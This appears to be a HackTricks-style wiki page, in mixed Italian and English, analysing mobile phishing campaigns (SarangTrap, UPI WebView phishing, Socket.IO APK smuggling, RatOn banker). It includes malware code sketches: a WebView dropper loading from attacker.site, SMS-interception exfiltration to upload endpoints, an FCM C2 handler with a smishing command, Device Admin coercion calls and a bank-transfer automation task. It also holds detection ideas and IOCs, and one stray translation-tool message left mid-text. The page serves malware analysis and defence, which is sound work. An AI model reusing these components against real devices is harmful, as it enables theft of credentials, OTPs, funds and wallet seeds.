# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina tratta le tecniche usate da threat actors per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare dozzine di domini look-alike (dating, cloud share, car service…).
– Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* istruzioni di installazione Android (`.apk`) che iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK *unsigned* o “third-party store”.
* iOS: `itms-services://` o link HTTPS semplice a un **mobileconfig** profile malevolo (vedi sotto).
3. **Post-install Social Engineering**
* Alla prima esecuzione l'app richiede un **invitation / verification code** (illusione di accesso esclusivo).
* Il codice viene **POSTed over HTTP** al Command-and-Control (C2).
* C2 risponde `{"success":true}` ➜ il malware continua.
* Analisi dinamica Sandbox / AV che non invia mai un codice valido non vede **comportamento malevolo** (evasione).
4. **Runtime Permission Abuse** (Android)
* Permessi dangerous sono richiesti solo **dopo la risposta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il percorso Java/Kotlin che legge gli SMS via reflection ⇒ abbassa il punteggio statico pur rimanendo funzionale su dispositivi che concedono il permesso tramite abuso di `AppOps` o target datati.
5. **Facade UI & Background Collection**
* L'app mostra viste innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, numero di telefono
- dump completo di `ContactsContract` (array JSON)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre le dimensioni
- Eventuale contenuto SMS (`content://sms`)
I payload vengono **batch-zipped** e inviati tramite `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per enrollare il dispositivo in una supervisione simile a “MDM”.
* Istruzioni di social-engineering:
1. Apri Impostazioni ➜ *Profile downloaded*.
2. Tocca *Install* tre volte (screenshot nella pagina di phishing).
3. Trust the unsigned profile ➜ l'attaccante ottiene l'entitlement *Contacts* & *Photo* senza revisione App Store.
7. **Network Layer**
* HTTP plain, spesso sulla porta 80 con HOST header tipo `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la valutazione malware, automatizzare la fase del codice di invito con Frida/Objection per raggiungere il branch malevolo.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con il runtime `PackageManager#getRequestedPermissions()`; permessi dangerous mancanti sono un flag rosso.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare raffiche sospette di POST dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlement eccessivi.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** per catturare burst improvvisi di domini ricchi di keyword.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` da client Dalvik fuori dal Google Play.
* **Invite-code Telemetry** – POST di codici numerici da 6–8 cifre poco dopo l'installazione dell'APK può indicare staging.
* **MobileConfig Signing** – Bloccare i configuration profiles unsigned tramite policy MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Questo pattern è stato osservato in campagne che sfruttano tematiche sui benefici governativi per rubare credenziali UPI indiane e OTP. Gli operatori concatenano piattaforme affidabili per la distribuzione e la resilienza.

### Delivery chain across trusted platforms
- YouTube video lure → la descrizione contiene un short link
- Shortlink → sito di phishing su GitHub Pages che imita il portale legittimo
- Lo stesso repo GitHub ospita un APK con un falso badge “Google Play” che punta direttamente al file
- Pagine di phishing dinamiche ospitate su Replit; il canale di comando remoto utilizza Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Il primo APK è un installer (dropper) che contiene il malware reale in `assets/app.apk` e invita l'utente a disabilitare Wi‑Fi/dati mobili per attenuare il rilevamento cloud.
- L'embedded payload si installa con un'etichetta innocua (ad es., “Aggiornamento Sicuro”). Dopo l'installazione, sia l'installer che il payload sono presenti come app separate.

Suggerimento per triage statico (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint tramite shortlink
- Malware recupera una lista in testo in chiaro, separata da virgole, di endpoint attivi da un shortlink; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-codice:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Lo step “Make payment of ₹1 / UPI‑Lite” carica un modulo HTML dell'attaccante dall'endpoint dinamico dentro un WebView e cattura campi sensibili (telefono, banca, UPI PIN) che vengono `POST`ati a `addup.php`.

Loader minimale:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagazione e intercettazione SMS/OTP
- Vengono richiesti permessi aggressivi al primo avvio:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono ripetuti per inviare in massa smishing SMS dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con metadata (sender, body, SIM slot, per-device random ID) su `/addsm.php`.

Bozza del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra su FCM; i messaggi push contengono un campo `_type` usato come switch per attivare azioni (es., aggiornare template di testo di phishing, abilitare/disabilitare comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Bozza dell'Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Pattern di rilevamento e IOC
- L'APK contiene un payload secondario in `assets/app.apk`
- WebView carica il pagamento da `gate.htm` ed esfiltra verso `/addup.php`
- Esfiltrazione SMS verso `/addsm.php`
- Recupero della config guidato da shortlink (es., `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate genericamente come “Update/Secure Update”
- Messaggi FCM `data` con un discriminatore `_type` in app non attendibili

### Idee per rilevamento e difesa
- Segnala app che istruiscono gli utenti a disabilitare la rete durante l'installazione e poi eseguono il side-load di un secondo APK da `assets/`.
- Allerta sulla tupla di permessi: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flussi di pagamento basati su WebView.
- Monitoraggio egress per `POST /addup.php|/addsm.php` su host non corporate; bloccare infrastrutture note.
- Regole Mobile EDR: app non attendibile che si registra a FCM e si ramifica in base al campo `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Tipico flusso client osservato sul campo:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Perché elude controlli semplici:
- Nessun URL APK statico è esposto; il payload viene ricostruito in memoria dai frame WebSocket.
- I filtri URL/MIME/estensione che bloccano risposte .apk dirette possono non rilevare dati binari incapsulati tramite WebSockets/Socket.IO.
- I crawler e le sandbox URL che non eseguono WebSockets non recupereranno il payload.

Idee per hunting e detection:
- Web/network telemetry: segnalare sessioni WebSocket che trasferiscono grandi chunk binari seguite dalla creazione di un Blob con MIME application/vnd.android.package-archive e da un click programmato su `<a download>`. Cercare stringhe client come socket.emit('startDownload'), ed eventi chiamati chunk, downloadProgress, downloadComplete negli script di pagina.
- Play-store spoof heuristics: su domini non Google che servono pagine simili a Play, cercare stringhe UI di Google Play come http.html:"VfPpkd-jY41G-V67aGc", template in lingue miste e flussi falsi di “verification/progress” pilotati da eventi WS.
- Controls: bloccare la consegna di APK da origini non Google; applicare politiche MIME/estensione che includano il traffico WebSocket; preservare i prompt di download sicuro del browser.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abusi Android Accessibility/Overlay & Device Admin, automazione ATS e orchestrazione relay NFC – caso di studio RatOn

La campagna RatOn banker/RAT (ThreatFabric) è un esempio concreto di come le operazioni moderne di mobile phishing combinino WebView droppers, automazione UI guidata da Accessibility, overlay/ransom, coercizione tramite Device Admin, Automated Transfer System (ATS), takeover di crypto wallet e persino orchestrazione relay NFC. Questa sezione astrae le tecniche riutilizzabili.

### Stage-1: WebView → native install bridge (dropper)
Attaccanti presentano una WebView che punta a una pagina dell'attaccante e iniettano un'interfaccia JavaScript che espone un installer nativo. Un tap su un bottone HTML invoca codice nativo che installa un APK di seconda fase incluso negli assets del dropper e lo lancia direttamente.

Pattern minimo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Non hai incollato l'HTML o il contenuto da tradurre. Per favore fornisci il testo HTML/Markdown (o indica la sezione specifica del file) che vuoi tradurre in italiano.

Nota: seguirò le regole indicate — non tradurrò codice, nomi di tecniche, parole comuni di hacking, nomi di piattaforme cloud/SaaS, link, percorsi o tag/marker come {#ref}, {#include}, ecc.
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity esplicito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea per l'hunting: app non attendibili che chiamano `addJavascriptInterface()` e espongono a WebView metodi simili a quelli di un installer; APK che include un payload secondario incorporato in `assets/` e invoca la Package Installer Session API.

### Funnel di consenso: Accessibility + Device Admin + richieste runtime successive
Stage-2 apre una WebView che ospita una pagina “Accesso”. Il suo pulsante invoca un metodo esportato che porta la vittima nelle impostazioni Accessibility e richiede l'abilitazione del servizio malevolo. Una volta concessa, il malware usa Accessibility per cliccare automaticamente attraverso i successivi dialoghi di permesso runtime (contatti, overlay, gestione impostazioni di sistema, ecc.) e richiede Device Admin.

- Accessibility programmaticamente aiuta ad accettare i prompt successivi trovando pulsanti come “Consenti”/“OK” nell'albero dei nodi e inviando click.
- Verifica/richiesta del permesso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vedi anche:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing/ricatto con overlay via WebView
Gli operatori possono inviare comandi per:
- renderizzare un overlay a schermo intero da un URL, oppure
- passare HTML inline che viene caricato in un overlay WebView.

Usi probabili: coercizione (inserimento PIN), apertura del wallet per catturare i PIN, messaggi di riscatto. Tenere un comando per assicurarsi che il permesso per l'overlay sia concesso se mancante.

### Modello di controllo remoto – pseudo-schermo testuale + screen-cast
- Bassa larghezza di banda: periodicamente dumpare l'albero dei nodi Accessibility, serializzare testi/ruoli/bounds visibili e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` una tantum e `screen_live` continuo).
- Alta fedeltà: richiedere MediaProjection e avviare lo screen-casting/recording su richiesta (comandi come `display` / `record`).

### Playbook ATS (automazione di app bancarie)
Dato un task in JSON, aprire l'app bancaria, guidare la UI via Accessibility con un mix di query testuali e tap su coordinate, e inserire il PIN di pagamento della vittima quando richiesto.

Esempio di task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuovo pagamento"
- "Zadat platbu" → "Inserisci pagamento"
- "Nový příjemce" → "Nuovo beneficiario"
- "Domácí číslo účtu" → "Numero di conto domestico"
- "Další" → "Avanti"
- "Odeslat" → "Invia"
- "Ano, pokračovat" → "Sì, continua"
- "Zaplatit" → "Paga"
- "Hotovo" → "Fatto"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Sicurezza/Recupero, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- Far scadere la credenziale corrente per forzare la modifica (Accessibilità cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Hunt for WebViews with `addJavascriptInterface()` exposing installer/permission methods; pages ending in “/access” that trigger Accessibility prompts.
- Alert on apps that generate high-rate Accessibility gestures/clicks shortly after being granted service access; telemetry that resembles Accessibility node dumps sent to C2.
- Monitor Device Admin policy changes in untrusted apps: `lockNow`, password expiration, keyguard feature toggles.
- Alert on MediaProjection prompts from non-corporate apps followed by periodic frame uploads.
- Detect installation/launch of an external NFC-relay app triggered by another app.
- For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
